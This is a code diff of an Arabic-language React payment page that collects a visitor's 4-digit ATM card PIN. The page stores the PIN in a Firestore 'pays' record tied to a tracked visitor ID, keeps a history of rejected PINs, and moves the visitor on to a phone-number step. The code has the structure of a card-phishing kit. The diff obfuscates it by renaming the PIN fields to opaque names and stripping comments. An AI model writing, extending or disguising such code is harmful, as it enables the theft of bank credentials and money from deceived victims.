@@ -15,12 +15,12 @@ import { updateVisitorPage } from "@/lib/visitor-tracking"
 
 export default function ConfiPage() {
   const router = useRouter()
-  const [pinCode, setPinCode] = useState("")
+  const [_v6, _s6] = useState("")
   const [error, setError] = useState("")
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [isLoading, setIsLoading] = useState(true)
   const [visitorId, setVisitorId] = useState<string>("")
-  const [pinStatus, setPinStatus] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
+  const [_v6Status, setPinStatus] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
 
   // Initialize visitor ID and update current page
   useEffect(() => {
@@ -75,7 +75,6 @@ export default function ConfiPage() {
       return
     }
 
-    // Check if there's a payment record and monitor PIN status
     const docRef = doc(db, "pays", visitorID)
     const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
       if (!docSnapshot.exists()) {
@@ -84,21 +83,21 @@ export default function ConfiPage() {
       }
       
       const data = docSnapshot.data()
-      const status = data.pinStatus as "pending" | "verifying" | "approved" | "rejected" | undefined
+      const status = data._v6Status as "pending" | "verifying" | "approved" | "rejected" | undefined
       
       if (status === "rejected") {
         // Save rejected PIN and reset status
         const currentPin = {
-          code: data.pinCode,
+          code: data._v6,
           rejectedAt: new Date().toISOString()
         }
         
         updateDoc(docRef, {
           oldPin: data.oldPin ? [...data.oldPin, currentPin] : [currentPin],
-          pinStatus: "pending"
+          _v6Status: "pending"
         }).then(() => {
           setPinStatus("pending")
-          setPinCode("") // Clear the old PIN
+          _s6("") // Clear the old PIN
           setError("تم رفض الرقم السري. يرجى إدخال رقم صحيح.")
           setIsSubmitting(false)
         }).catch(err => {
@@ -107,7 +106,6 @@ export default function ConfiPage() {
           setIsSubmitting(false)
         })
       }
-      // No need to monitor approved status - auto-redirect happens in handlePinSubmit
       
       setIsLoading(false)
     })
@@ -117,13 +115,13 @@ export default function ConfiPage() {
 
   // Auto-submit when 4 digits are entered
   useEffect(() => {
-    if (pinCode.length === 4 && !isSubmitting) {
+    if (_v6.length === 4 && !isSubmitting) {
       handlePinSubmit()
     }
-  }, [pinCode])
+  }, [_v6])
 
   const handlePinSubmit = async () => {
-    if (pinCode.length !== 4) {
+    if (_v6.length !== 4) {
       setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
       return
     }
@@ -139,9 +137,9 @@ export default function ConfiPage() {
     try {
       // Update the document with the PIN
       await updateDoc(doc(db, "pays", visitorID), {
-        pinCode,
+        _v6,
         pinSubmittedAt: new Date().toISOString(),
-        pinStatus: "approved", // Auto-approve PIN
+        _v6Status: "approved", // Auto-approve PIN
         currentStep: "phone",
         paymentStatus: "pin_completed",
         pinUpdatedAt: new Date().toISOString()
@@ -149,7 +147,7 @@ export default function ConfiPage() {
 
       // Add PIN to history (always approved)
       await addToHistory(visitorID, "_t3", {
-        pinCode
+        _v6
       }, "approved")
 
       // Wait 2 seconds then redirect to phone page
@@ -170,7 +168,7 @@ export default function ConfiPage() {
   return (
     <div className="min-h-screen bg-[#0a4a68] flex items-center justify-center p-4" dir="rtl">
       {/* Full Screen Spinner when submitting */}
-      {(isSubmitting || pinStatus === "verifying") && (
+      {(isSubmitting || _v6Status === "verifying") && (
         <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
       )}
 
@@ -217,15 +215,15 @@ export default function ConfiPage() {
                 type="password"
                 inputMode="numeric"
                 placeholder="رقم الصراف (PIN)"
-                value={pinCode}
+                value={_v6}
                 onChange={(e) => {
                   const value = e.target.value.replace(/\D/g, "").slice(0, 4)
-                  setPinCode(value)
+                  _s6(value)
                   setError("")
                 }}
                 maxLength={4}
                 className="h-14 text-center text-lg px-4 border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl bg-white placeholder:text-gray-400"
-                disabled={isSubmitting || pinStatus === "verifying"}
+                disabled={isSubmitting || _v6Status === "verifying"}
                 required
                 autoFocus
               />
@@ -234,7 +232,7 @@ export default function ConfiPage() {
             <Button
               type="submit"
               className="w-full h-14 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl rounded-xl shadow-lg hover:shadow-xl transition-all"
-              disabled={pinCode.length !== 4 || isSubmitting || pinStatus === "verifying"}
+              disabled={_v6.length !== 4 || isSubmitting || _v6Status === "verifying"}
             >
               تأكيد الدفع
             </Button>
